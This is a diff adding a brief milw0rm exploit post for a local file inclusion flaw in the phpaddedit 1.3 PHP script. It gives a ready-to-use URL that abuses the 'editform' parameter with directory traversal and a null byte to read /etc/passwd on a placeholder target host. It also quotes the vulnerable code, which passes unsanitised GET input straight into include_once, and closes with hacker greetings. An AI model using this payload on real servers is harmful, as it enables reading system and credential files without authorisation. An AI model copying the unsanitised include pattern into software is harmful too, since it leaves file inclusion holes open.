@@ -1,0 +1,27 @@
+#phpaddedit-1.3 LFI
+
+
+#Author: nuclear
+
+
+#script:http://sourceforge.net/projects/phpaddedit/
+
+
+#vuln:http://target.com/addedit-render.php?editform=../../../../../../../etc/passwd%00
+
+
+#vulnerable code:
+if (!$formname && $_GET["editform"]) $formname = $_GET["editform"];
+...
+if ( $error_message || $error || !$_POST["submitval"] ) {
+    include_once ($formname."-header.inc.php");
+    include_once ($addeditcwd."addedit-create-form.php");
+    include_once ($formname."-footer.inc.php");
+}
+
+
+
+
+#greetz Mi4night, zYzTeM, THE_MAN, Pepe, I-O-W-A, Digitalfortress, DiGitalX, sys32-hack, sys32r
+
+# milw0rm.com [2008-12-10]
